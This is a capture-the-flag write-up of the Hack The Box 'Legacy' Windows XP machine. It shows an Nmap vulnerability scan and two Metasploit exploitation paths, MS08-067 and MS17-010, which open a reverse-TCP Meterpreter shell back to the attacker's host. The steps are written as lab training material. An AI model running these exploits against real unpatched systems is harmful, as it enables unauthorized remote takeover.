---
title: "Legacy"
---

# Hack The Box - Legacy


![Cap dashboard screenshot](legacy.png)

This write-up is based on **Legacy**, a Windows machine on Hack The Box. The box starts with Samba and exposes two major vulnerabilities: **MS08-067** and **MS17-010**. Both can be used to gain remote code execution, and I’ll demonstrate each path in this post. No privilege escalation is needed to obtain either the user flag or the root flag.

## Scanning the Network

I started with an Nmap scan and found ports 139 and 445 open as NetBIOS-ssn and Microsoft-ds, respectively. I then ran a more intensive scan with vulnerability scripts to collect additional details.

```bash
nmap -sV -A -T4 -vv --script vuln 10.129.1.111
```

### Nmap Results

```text
Nmap scan report for 10.129.1.111
Host is up (0.57s latency).
Not shown: 996 filtered ports

PORT     STATE   SERVICE       VERSION
139/tcp  open    netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open    microsoft-ds   Microsoft Windows XP microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
| smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

The scan confirms the target is vulnerable to both MS08-067 and MS17-010, so I moved straight to exploitation.

## Exploiting MS08-067

First, I searched Metasploit for the MS08-067 module:

```bash
msfconsole
search ms08-067
```

```text
Matching Modules

#  Name                                 Disclosure Date  Rank   Check  Description
0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
```

I selected the module and configured the target and callback options:

```bash
use 0
show options
set RHOSTS 10.129.1.111
set LHOST tun0
exploit
```

### Module Options

```text
Module options (exploit/windows/smb/ms08_067_netapi):

Name     Current Setting  Required  Description
RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
RPORT    445              yes       The SMB service port (TCP)
SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload options (windows/meterpreter/reverse_tcp):
Name      Current Setting  Required  Description
EXITFUNC  thread           yes       Exit technique
LHOST     10.10.14.44      yes       The listen address
LPORT     4444             yes       The listen port
```

After running the exploit, I received a Meterpreter session and dropped into a shell:

```text
meterpreter > shell
Process 1916 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
C:\WINDOWS\system32>
```

This confirmed that MS08-067 gives direct remote code execution.

## Exploiting MS17-010

I then moved on to MS17-010. Searching Metasploit shows multiple relevant modules:

```bash
search ms17-010
```

```text
Matching Modules

#  Name                                           Disclosure Date  Rank     Check  Description
0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

For code execution, I chose `ms17_010_psexec`:

```bash
use 4
show options
set RHOSTS 10.129.1.111
set LHOST tun0
exploit
```

### Module Options

```text
Module options (exploit/windows/smb/ms17_010_psexec):

Name                  Current Setting  Required  Description
DBGTRACE              false            yes       Show extra debug trace info
LEAKATTEMPTS          99               yes       How many times to try to leak transaction
NAMEDPIPE                              no        A named pipe that can be connected to (leave blank for auto)
NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes
RHOSTS                                 yes       The target host(s)
RPORT                 445              yes       The Target port (TCP)
SHARE                 ADMIN$           yes       The share to connect to
SMBUser                                no       The username to authenticate as
SMBPass                                no       The password for the specified username
```

The exploit succeeded and opened a shell:

```text
meterpreter > shell
Microsoft Windows XP [Version 5.1.2600]
C:\WINDOWS\system32>
```

## Attack Path

- Scan the host with Nmap.
- Identify SMB on ports 139 and 445.
- Confirm the host is vulnerable to MS08-067 and MS17-010.
- Use `ms08_067_netapi` to gain a shell.
- Use `ms17_010_psexec` as an alternative shell path.
- Obtain access to system level permisson. 
